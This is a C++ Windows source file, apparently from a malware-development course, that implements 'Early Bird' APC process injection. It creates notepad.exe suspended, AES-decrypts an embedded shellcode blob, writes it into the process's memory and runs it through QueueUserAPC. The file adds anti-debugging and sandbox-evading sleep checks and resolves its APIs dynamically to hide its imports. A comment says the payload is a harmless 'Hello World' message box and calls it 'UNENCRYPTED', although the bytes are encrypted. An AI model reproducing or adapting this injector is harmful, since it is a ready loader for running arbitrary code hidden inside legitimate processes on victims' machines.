#include <iostream>
#include <stdlib.h>
#include <windows.h>
#include <string>
//#include "ntbasic.h"


typedef BOOL (WINAPI* pfnWriteProcessMemory)(
    IN  HANDLE  hProcess,
    IN  LPVOID  lpBaseAddress,
    IN  LPCVOID lpBuffer,
    IN  SIZE_T  nSize,
    OUT SIZE_T* lpNumberOfBytesWritten
);

typedef LPVOID (WINAPI* pfnVirtualAllocEx)(
    IN           HANDLE hProcess,
    IN OPTIONAL  LPVOID lpAddress,
    IN           SIZE_T dwSize,
    IN           DWORD  flAllocationType,
    IN           DWORD  flProtect
);

typedef DWORD (WINAPI* pfnQueueUserAPC)(
    IN PAPCFUNC  pfnAPC,
    IN HANDLE    hThread,
    IN ULONG_PTR dwData
);

typedef BOOL (WINAPI* pfnCreateProcessW)(
    IN OPTIONAL       LPCWSTR               lpApplicationName,
    IN OUT OPTIONAL   LPWSTR                lpCommandLine,
    IN OPTIONAL       LPSECURITY_ATTRIBUTES lpProcessAttributes,
    IN OPTIONAL       LPSECURITY_ATTRIBUTES lpThreadAttributes,
    IN                BOOL                  bInheritHandles,
    IN                DWORD                 dwCreationFlags,
    IN OPTIONAL       LPVOID                lpEnvironment,
    IN OPTIONAL       LPCWSTR               lpCurrentDirectory,
    IN                LPSTARTUPINFOW        lpStartupInfo,
    OUT               LPPROCESS_INFORMATION lpProcessInformation
);

typedef DWORD (WINAPI* pfnResumeThread)(
    IN HANDLE hThread
);

typedef DWORD (WINAPI* pfnSleepEx)(
    IN DWORD dwMilliseconds,
     BOOL  bAlertable
);

typedef BOOL (WINAPI* pfnCloseHandle)(
    IN HANDLE hObject
);


// MessageBox shellcode - 64-bit (exitfunc = thread)
//         - >> Hello World ! <<
//              UNENCRYPTED

unsigned char key[] = { 0x8, 0x54, 0x1e, 0x77, 0x57, 0x87, 0xc5, 0x1c, 0x6a, 0x3, 0x49, 0x52, 0x98, 0xc4, 0xad, 0x6e };
unsigned char shellcode[] = { 0x25, 0xc0, 0x7c, 0xa9, 0x60, 0xec, 0x57, 0x42, 0x23, 0x98, 0x44, 0x8f, 0xb, 0xa5, 0xd9, 0xc5, 0xac, 0x8b, 0x83, 0x15, 0x40, 0xa4, 0xcd, 0x44, 0x8c, 0xab, 0x83, 0xa4, 0x3e, 0x18, 0x26, 0x8c, 0x50, 0xfb, 0xf4, 0xa9, 0xae, 0x60, 0xc5, 0x95, 0xe2, 0xd3, 0xa7, 0x8c, 0xe8, 0xc9, 0xf, 0x43, 0x95, 0xa8, 0x8e, 0x2b, 0x1e, 0x92, 0x49, 0x3b, 0xac, 0x2d, 0xa3, 0xcb, 0x1a, 0xa4, 0xca, 0x3c, 0x14, 0xbb, 0x9, 0xc, 0xb5, 0x8, 0x0, 0x9c, 0xb0, 0xf1, 0x69, 0x4d, 0x6e, 0x2, 0x3e, 0x48, 0xec, 0x96, 0x2d, 0x44, 0x65, 0x90, 0x7c, 0x8b, 0x4c, 0xa8, 0x48, 0xdb, 0xe3, 0x48, 0x23, 0x76, 0x42, 0x74, 0x76, 0x2c, 0x0, 0x7e, 0xea, 0x20, 0x6d, 0x9e, 0xb3, 0xb7, 0x8b, 0x73, 0xe4, 0xe4, 0x68, 0x5, 0xb, 0xec, 0xb7, 0xa, 0x60, 0x39, 0xe5, 0x50, 0xe8, 0x4d, 0x7e, 0x1a, 0x47, 0xa6, 0x12, 0x39, 0x40, 0x19, 0xa3, 0xed, 0xa1, 0x2f, 0x8, 0x51, 0x8a, 0xc, 0xf7, 0x81, 0x7b, 0x56, 0xd3, 0x43, 0x4a, 0xfc, 0xb7, 0x8, 0x6d, 0x45, 0xd1, 0x49, 0x7a, 0xfb, 0xba, 0x63, 0x39, 0xb1, 0xfc, 0x12, 0x97, 0xd9, 0x51, 0xac, 0xd3, 0x62, 0x27, 0xf8, 0x8b, 0xb4, 0x93, 0x64, 0x6b, 0xf6, 0x9e, 0xf6, 0xe7, 0x49, 0xe3, 0x6c, 0x40, 0x18, 0x69, 0x4, 0x21, 0xb2, 0xc6, 0x42, 0x5e, 0x98, 0xc1, 0xf6, 0x8d, 0x8b, 0x62, 0xf2, 0x55, 0xa6, 0xcd, 0x44, 0xe3, 0x55, 0xde, 0x5b, 0xfb, 0xf7, 0x6c, 0x8b, 0xb4, 0xb1, 0x8d, 0x65, 0xcf, 0x4a, 0xe9, 0xf, 0x53, 0x53, 0x5e, 0x7c, 0x2f, 0xe3, 0xcf, 0x5d, 0x77, 0xf4, 0x49, 0xbf, 0xac, 0x49, 0xbc, 0xb2, 0x1c, 0x5, 0x3c, 0x11, 0xc0, 0xe5, 0x35, 0x42, 0x15, 0x56, 0x47, 0x18, 0x81, 0xe6, 0xca, 0x4e, 0x91, 0x5d, 0x33, 0xe2, 0x15, 0xbc, 0xbf, 0x8e, 0x69, 0x82, 0xb2, 0x43, 0xbd, 0x5d, 0x99, 0xa3, 0x34, 0xd3, 0xfb, 0xf7, 0x66, 0xfb, 0xd6, 0x0, 0xac, 0x92, 0x2b, 0x8b, 0xbf, 0x1b, 0xa, 0xd0, 0xcd, 0xa7, 0x77, 0xa0, 0x3a, 0x99, 0xa4, 0x28, 0xa1, 0x46, 0xcd, 0x75, 0x64, 0x9d, 0xcb, 0xf3, 0x73, 0xd6, 0x49, 0xb1, 0xef, 0xce, 0x6f, 0xf0, 0xd8, 0xb6, 0xcc, 0x6c, 0xd7, 0x34, 0x67, 0xda, 0x9d, 0xe6, 0xf9, 0x94, 0x59, 0x59, 0x7d, 0x18, 0x80, 0x17, 0xc5, 0x88, 0xbf, 0x43, 0x5a, 0x4d, 0x51, 0xbc, 0xaf, 0x78, 0xc4, 0xdd, 0x8c, 0xb9, 0x8c, 0xab, 0xf9, 0x5e, 0x1e, 0xc5, 0x7a, 0x43, 0x66, 0x83, 0xcb, 0xd, 0xf8, 0x47, 0x67, 0xdb, 0xb5, 0x3b, 0x80, 0xac, 0xdf, 0xbb, 0x0, 0x3e, 0x7d, 0x88, 0x5, 0x82, 0x4c, 0x2a, 0x39, 0xf5, 0xe5, 0x81, 0x46, 0x2e, 0x5b, 0x17, 0x9f, 0x2d, 0x2e, 0xc, 0xb1, 0x83, 0xbe, 0xaa, 0x7c, 0x2e, 0xd2, 0x30, 0x54, 0x65, 0xf1, 0xf5, 0x76, 0xe4, 0x8a, 0x90, 0x2b, 0x88, 0x64, 0xfd, 0xa1, 0x8d, 0x19, 0xeb, 0xbe, 0xd2, 0x79, 0xee, 0x90, 0x74, 0xf, 0xe9, 0x47, 0x34, 0xc2, 0x7f, 0x16, 0x95, 0xd, 0x53, 0x49, 0xa3, 0x76, 0x4b, 0x62, 0xa6, 0x74, 0x7a, 0x4, 0xd3, 0xa6, 0xef, 0x4d, 0xf3, 0x24, 0xa3, 0x85, 0x83, 0x4e, 0xcb, 0x45, 0xdc, 0xe2, 0x19, 0x79, 0x2b, 0xe7, 0x3c };

SIZE_T scSize = sizeof(shellcode);

// RTO Mal Dev course
int AESDecrypt(unsigned char* payload, DWORD payload_len, char* key, size_t keylen) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    BOOL CryptAcquire = CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
    if (CryptAcquire == false) {
        //printf("CryptAcquireContextW Failed: %d\n", GetLastError());
        return -1;
    }

    BOOL CryptCreate = CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash);
    if (CryptCreate == false) {
        //printf("CryptCreateHash Failed: %d\n", GetLastError());
        return -1;
    }

    BOOL CryptHash = CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0);
    if (CryptHash == false) {
        //printf("CryptHashData Failed: %d\n", GetLastError());
        return -1;
    }

    BOOL CryptDerive = CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey);
    if (CryptDerive == false) {
        //printf("CryptDeriveKey Failed: %d\n", GetLastError());
        return -1;
    }

    BOOL Crypt_Decrypt = CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, payload, &payload_len);
    if (Crypt_Decrypt == false) {
        //printf("CryptDecrypt Failed: %d\n", GetLastError());
        return -1;
    }

    CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);

    return 0;
}

int EarlyBird(HANDLE pHandle, HANDLE hThread, unsigned char* shellcode, SIZE_T scSize, DWORD Pid) {

    // Define NT imports
    // ------------------------------------------------------------------------------------------------------------
    pfnVirtualAllocEx pVirtualAllocEx = (pfnVirtualAllocEx)GetProcAddress(GetModuleHandleW(L"KERNEL32.DLL"), "VirtualAllocEx");
    if (pVirtualAllocEx == NULL) {
        //printf("[-] VirtualAllocEx [KERNL32] Failed     ->      [ %p ] [ %d ]\n", pVirtualAllocEx, GetLastError());
        return -2;
    }
    //printf("[*] VirtualAllocEx [KERNEL32] Address       ->      [ %p ]\n", pVirtualAllocEx);
    
    pfnWriteProcessMemory pWriteProcessMemory = (pfnWriteProcessMemory)GetProcAddress(GetModuleHandleW(L"KERNEL32.DLL"), "WriteProcessMemory");
    if (pWriteProcessMemory == NULL) {
        //printf("[-] WriteProcessMemory [KERNEL32] Failed     ->      [ %p ] [ %d ]\n", pWriteProcessMemory, GetLastError());
        return -2;
    }
    //printf("[*] WriteProcessMemory [KERNEL32] Address     ->      [ %p ]\n", pWriteProcessMemory);

    pfnQueueUserAPC pQueueUserAPC = (pfnQueueUserAPC)GetProcAddress(GetModuleHandleW(L"KERNEL32.DLL"), "QueueUserAPC");
    if (pQueueUserAPC == NULL) {
        //printf("[-] QueueUserAPC [KERNEL32] Failed     ->      [ %p ] [ %d ]\n", pQueueUserAPC, GetLastError());
        return -2;
    }
    //printf("[*] QueueUserAPC [KERNEL32] Address       ->      [ %p ]\n", pQueueUserAPC);

    pfnResumeThread pResumeThread = (pfnResumeThread)GetProcAddress(GetModuleHandleW(L"KERNEL32.DLL"), "ResumeThread");
    if (pResumeThread == NULL) {
        //printf("[-] ResumeThread [KERNEL32] Failed     ->      [ %p ] [ %d ]\n", pResumeThread, GetLastError());
        return -2;
    }
    //printf("[*] ResumeThread [KERNEL32] Address       ->      [ %p ]\n", pResumeThread);

    pfnSleepEx pSleepEx = (pfnSleepEx)GetProcAddress(GetModuleHandleW(L"KERNEL32.DLL"), "SleepEx");
    if (pSleepEx == NULL) {
        //printf("[-] SleepEx [KERNL32] Failed     ->      [ %p ] [ %d ]\n", pSleepEx, GetLastError());
        return -2;
    }
    //printf("[*] SleepEx [KERNEL32] Address       ->      [ %p ]\n", pSleepEx);

    
    // ------------------------------------------------------------------------------------------------------------

    char pcName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD pcNameLength = sizeof(pcName);

    if (IsDebuggerPresent() == TRUE) {
        return -3;
    }
    else {
        if (!GetComputerNameA(pcName, &pcNameLength)) {
            return -3;
        }
        //printf("[SUCCESS] Computer Name   ->   [ %s ]\n", pcName);
        //printf("[INFO] Sleeping for 1\n");
        pSleepEx(15000, FALSE);
    }

    LPVOID memAlloc = pVirtualAllocEx(pHandle, 0, scSize, MEM_COMMIT, PAGE_EXECUTE_READ);
    if (!memAlloc) {
        //printf("[ERR] Memory Allocation Failed  [ %d ] \n", GetLastError());
        return -2;
    } //printf("[INFO] Memory allocation pointer: %p\n", (LPVOID)memAlloc);

    AESDecrypt(shellcode, scSize, (char*)key, (size_t)sizeof(key));

    SIZE_T bytesWritten = 0;
    DWORD wMem = pWriteProcessMemory(pHandle, (LPVOID)memAlloc, shellcode, scSize, &bytesWritten);
    if (!wMem) {
        //printf("[ERR] Write Memory Failed  [ %d ] \n", GetLastError());
        return -2;
    }

    if (pQueueUserAPC((PAPCFUNC)memAlloc, hThread, NULL)) {
        //Sleep(10000);
        pResumeThread(hThread);
    }
    return 0;
}


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow){
//int main() {

    pfnCreateProcessW pCreateProcessW = (pfnCreateProcessW)GetProcAddress(GetModuleHandleW(L"KERNEL32.DLL"), "CreateProcessW");
    if (pCreateProcessW == NULL) {
        //printf("[-] CreateProcessW [KERNEL32] Failed     ->      [ %p ] [ %d ]\n", pCreateProcessW, GetLastError());
        return -2;
    }
    //printf("[*] CreateProcessW [KERNEL32] Address       ->      [ %p ]\n", pCreateProcessW);

    pfnCloseHandle pCloseHandle = (pfnCloseHandle)GetProcAddress(GetModuleHandleW(L"KERNEL32.DLL"), "CloseHandle");
    if (pCloseHandle == NULL) {
        //printf("[-] CloseHandle [KERNEL32] Failed     ->      [ %p ] [ %d ]\n", pCloseHandle, GetLastError());
        return -2;
    }
    //printf("[*] CloseHandle [KERNEL32] Address       ->      [ %p ]\n", pCloseHandle);
    // ------------------------------------------------------------------------------------------------------------

    STARTUPINFOW si;
    PROCESS_INFORMATION pi;

    // Clear out startup and process info structures
    RtlSecureZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    RtlSecureZeroMemory(&pi, sizeof(pi));

    std::wstring pName = L"C:\\Windows\\System32\\notepad.exe";

    HANDLE pHandle = NULL;
    HANDLE hThread = NULL;
    DWORD Pid = 0;

    BOOL cProcess = pCreateProcessW(NULL, &pName[0], NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
    if (cProcess == FALSE) {
        //printf("[ERR] Process not created\n");
        return 0;
    }
    //printf("[SUCCESS] Process created \n");

    pHandle = pi.hProcess;
    hThread = pi.hThread;

    Pid = pi.dwProcessId;

    EarlyBird(pHandle, hThread, shellcode, scSize, Pid);
    pCloseHandle(pHandle);

	return 0;
}
